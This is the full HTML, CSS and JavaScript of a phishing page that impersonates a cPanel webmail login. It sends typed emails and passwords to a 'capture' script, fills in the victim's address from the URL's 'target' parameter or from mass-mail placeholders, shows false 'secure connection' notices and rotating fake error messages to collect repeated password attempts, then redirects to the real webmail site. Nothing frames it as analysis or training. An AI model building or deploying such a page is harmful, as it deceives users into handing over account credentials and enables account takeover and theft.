<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Lucida Grande", "Lucida Sans Unicode", Arial, Verdana, sans-serif;
            background: #f4f4f4;
            color: #333;
            font-size: 11px;
            line-height: 1.4;
        }
        
        .container {
            width: 100%;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .webmail-box {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            overflow: hidden;
            position: relative;
        }
        
        .header {
            background: linear-gradient(to bottom, #4a5568, #2d3748);
            color: #fff;
            padding: 20px;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57);
        }
        
        .logo {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        
        .subtitle {
            font-size: 12px;
            opacity: 0.9;
        }
        
        .login-form {
            padding: 30px 25px;
        }
        
        .session-info {
            background: #e8f4fd;
            border: 1px solid #bee5eb;
            border-radius: 4px;
            padding: 8px 12px;
            margin-bottom: 20px;
            font-size: 10px;
            color: #0c5460;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 18px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 11px;
            color: #555;
            font-weight: 600;
        }
        
        .form-group input[type="email"],
        .form-group input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e2e8f0;
            border-radius: 6px;
            font-size: 13px;
            font-family: inherit;
            background: #fff;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #4299e1;
            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
            background: #f7fafc;
        }
        
        .form-group input.pre-filled {
            background: #f0fff4;
            border-color: #48bb78;
        }
        
        .login-button {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            color: #fff;
            padding: 14px 20px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .login-button:hover {
            transform: translateY(-1px);
            box-shadow: 0 7px 14px rgba(50, 50, 93, 0.1), 0 3px 6px rgba(0, 0, 0, 0.08);
        }
        
        .login-button:active {
            transform: translateY(0);
        }
        
        .login-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .error-message {
            background: #fed7d7;
            border: 1px solid #feb2b2;
            color: #c53030;
            padding: 10px 12px;
            border-radius: 4px;
            margin-bottom: 15px;
            font-size: 11px;
            display: none;
            animation: slideDown 0.3s ease;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
            color: #666;
        }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #e2e8f0;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .footer {
            background: #f7fafc;
            padding: 15px 25px;
            text-align: center;
            font-size: 10px;
            color: #718096;
            border-top: 1px solid #e2e8f0;
        }
        
        .footer a {
            color: #4299e1;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .security-notice {
            margin-top: 10px;
            font-size: 9px;
            color: #a0aec0;
        }
        
        /* Session parameters styling */
        .session-params {
            position: absolute;
            top: -1000px;
            left: -1000px;
            visibility: hidden;
        }
        
        /* Responsive design */
        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }
            
            .webmail-box {
                margin: 0;
            }
            
            .login-form {
                padding: 25px 20px;
            }
        }
        
        /* Pre-fill highlight animation */
        @keyframes highlight {
            0% { background-color: #f0fff4; }
            50% { background-color: #c6f6d5; }
            100% { background-color: #f0fff4; }
        }
        
        .highlight-animation {
            animation: highlight 2s ease-in-out;
        }
    </style>
</head>
<body>
    <!-- Hidden session parameters to mimic real cPanel structure -->
    <div class="session-params">
        <input type="hidden" id="cpsess" value="prompt">
        <input type="hidden" id="fromPWA" value="1">
        <input type="hidden" id="pwd" value="">
        <input type="hidden" id="_x_zm_rtaid" value="I7SQ3VePRPS/cndRs57BvQ.1709509974548/">
        <input type="hidden" id="_x_zm_rhtaid" value="341'">
    </div>

    <div class="container">
        <div class="webmail-box">
            <div class="header">
                <div class="logo">Webmail</div>
                <div class="subtitle">Secure Email Access</div>
            </div>
            
            <form class="login-form" id="webmail-form" method="POST" action="enhanced_capture.php">
                <div class="session-info">
                    Session ID: <span id="session-display">cpsess###prompt</span> | Secure Connection Established
                </div>
                
                <div class="error-message" id="error-message">
                    Invalid login credentials. Please try again.
                </div>
                
                <div class="form-group">
                    <label for="user">Email Address</label>
                    <input type="email" id="user" name="email" required autocomplete="username" placeholder="Enter your email address">
                </div>
                
                <div class="form-group">
                    <label for="pass">Password</label>
                    <input type="password" id="pass" name="password" required autocomplete="current-password" placeholder="Enter your password">
                </div>
                
                <button type="submit" class="login-button" id="login-btn">
                    Log in
                </button>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    Authenticating...
                </div>
            </form>
            
            <div class="footer">
                <div>Powered by cPanel, Inc.</div>
                <div class="security-notice">
                    This is a secure connection. Your data is encrypted.
                </div>
            </div>
        </div>
    </div>

    <script>
        let attemptCount = 0;
        
        // Session simulation
        function generateSessionId() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = 'cpsess';
            for (let i = 0; i < 8; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result + '#prompt';
        }
        
        // Auto-grab email from URL hash and parameters
        function autoGrabEmail() {
            const hash = window.location.hash.substring(1);
            const emailField = document.getElementById('user');
            
            if (hash && hash.length > 0) {
                // Handle [[Email]] placeholder or direct email
                let email = hash;
                
                // Replace placeholder patterns
                email = email.replace(/\[\[-Email-\]\]/gi, '');
                email = email.replace(/\[\[email\]\]/gi, '');
                email = email.replace(/\{\{email\}\}/gi, '');
                
                // Check if it's an email pattern
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                
                if (emailRegex.test(email)) {
                    emailField.value = email;
                    emailField.classList.add('pre-filled', 'highlight-animation');
                    console.log('Auto-filled email from hash:', email);
                    document.getElementById('pass').focus();
                } else if (email.includes('@')) {
                    // Try to decode if it's URL encoded
                    try {
                        const decoded = decodeURIComponent(email);
                        if (emailRegex.test(decoded)) {
                            emailField.value = decoded;
                            emailField.classList.add('pre-filled', 'highlight-animation');
                            console.log('Auto-filled decoded email:', decoded);
                            document.getElementById('pass').focus();
                        }
                    } catch (e) {
                        console.log('Failed to decode email from hash');
                    }
                }
            }
            
            // Also check URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            const paramEmail = urlParams.get('email') || urlParams.get('user') || urlParams.get('target');
            
            if (paramEmail && !emailField.value) {
                emailField.value = decodeURIComponent(paramEmail);
                emailField.classList.add('pre-filled', 'highlight-animation');
                console.log('Auto-filled email from parameter:', paramEmail);
                document.getElementById('pass').focus();
            }
        }
        
        // Enhanced form submission
        document.getElementById('webmail-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = this;
            const email = document.getElementById('user').value.trim();
            const password = document.getElementById('pass').value;
            const errorDiv = document.getElementById('error-message');
            const loadingDiv = document.getElementById('loading');
            const submitBtn = document.getElementById('login-btn');
            
            // Basic validation
            if (!email || !password) {
                showError('Please enter both email address and password.');
                return;
            }
            
            if (!email.includes('@') || email.length < 5) {
                showError('Please enter a valid email address.');
                return;
            }
            
            // Increment attempt counter
            attemptCount++;
            
            // Show loading state
            hideError();
            loadingDiv.style.display = 'block';
            submitBtn.disabled = true;
            submitBtn.textContent = 'Authenticating...';
            
            // Simulate realistic server processing time
            const delay = Math.random() * 2000 + 1500; // 1.5-3.5 seconds
            
            setTimeout(() => {
                // Submit to capture script
                fetch('enhanced_capture.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams(new FormData(form))
                })
                .then(response => response.json())
                .then(data => {
                    loadingDiv.style.display = 'none';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Log in';
                    
                    if (data.signal === 'ok') {
                        // Success - show success message and redirect
                        document.querySelector('.login-form').innerHTML = 
                            '<div style="text-align: center; padding: 40px 20px;">' +
                            '<div style="color: #38a169; font-size: 16px; margin-bottom: 15px;">âœ“ Login Successful</div>' +
                            '<div style="color: #666; font-size: 12px; margin-bottom: 10px;">Redirecting to your mailbox...</div>' +
                            '<div style="color: #999; font-size: 10px;">Please wait while we load your emails.</div>' +
                            '</div>';
                        
                        setTimeout(() => {
                            window.location.href = 'https://webmail.cpanel.net/';
                        }, 2500);
                    } else {
                        // Show appropriate error message
                        const errorMessages = [
                            'Login failed. Please check your credentials and try again.',
                            'Invalid email address or password. Please verify your information.',
                            'Authentication failed. Please ensure your credentials are correct.',
                            'Login unsuccessful. Please check your email and password.'
                        ];
                        
                        const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
                        showError(data.msg || randomError);
                        
                        // Clear password field for security
                        document.getElementById('pass').value = '';
                        document.getElementById('pass').focus();
                    }
                })
                .catch(error => {
                    loadingDiv.style.display = 'none';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Log in';
                    showError('Connection error. Please check your internet connection and try again.');
                    console.error('Fetch error:', error);
                });
            }, delay);
        });
        
        function showError(message) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
        }
        
        function hideError() {
            document.getElementById('error-message').style.display = 'none';
        }
        
        // Initialize on page load
        window.addEventListener('load', function() {
            // Set random session ID
            document.getElementById('session-display').textContent = generateSessionId();
            
            // Auto-grab email
            autoGrabEmail();
            
            // Focus appropriate field
            const emailField = document.getElementById('user');
            if (emailField.value && emailField.value.length > 0) {
                document.getElementById('pass').focus();
            } else {
                emailField.focus();
            }
            
            // Remove highlight animation after it completes
            setTimeout(() => {
                emailField.classList.remove('highlight-animation');
            }, 2000);
        });
        
        // Handle hash changes
        window.addEventListener('hashchange', function() {
            autoGrabEmail();
        });
        
        // Enter key handling
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && (e.target.id === 'user' || e.target.id === 'pass')) {
                document.getElementById('webmail-form').dispatchEvent(new Event('submit'));
            }
        });
        
        // Enhanced security simulation
        setInterval(function() {
            const sessionElement = document.getElementById('session-display');
            if (sessionElement && Math.random() < 0.1) { // 10% chance every interval
                sessionElement.style.opacity = '0.7';
                setTimeout(() => {
                    sessionElement.style.opacity = '1';
                }, 200);
            }
        }, 30000); // Every 30 seconds
    </script>
</body>
</html>
